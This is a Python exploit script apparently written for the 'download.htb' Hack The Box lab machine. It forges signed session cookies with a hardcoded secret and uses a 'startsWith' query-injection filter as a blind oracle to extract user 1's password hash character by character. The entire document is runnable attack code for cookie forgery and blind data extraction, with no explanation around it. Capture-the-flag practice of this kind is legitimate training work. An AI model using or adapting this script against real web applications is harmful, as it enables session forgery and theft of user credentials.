import requests
import json
import base64
import hmac

url = "http://download.htb"
keySecret = b"8929874489719802418902487651347865819634518936754"

def getSignature(string):
    return base64.urlsafe_b64encode(hmac.new(keySecret, msg=string.encode(), digestmod="sha1").digest()).decode().rstrip("=")

def getCookie(data):
    dataCookie = base64.b64encode(json.dumps(data).encode()).decode()
    return {
        "download_session": dataCookie,
        "download_session.sig": getSignature(f"download_session={dataCookie}")
    }

hash = ""

for _ in range(32):
    for char in "0123456789abcdef":
        cookies = getCookie(
            {
                "user": {
                    "id": 1,
                    "password": {
                        "startsWith": hash + char
                    }
                }
            }
        )
        response = requests.get(f"{url}/home/", cookies=cookies)
        if "No files found" not in response.text:
            hash += char
            print("Password hash: ", hash)
            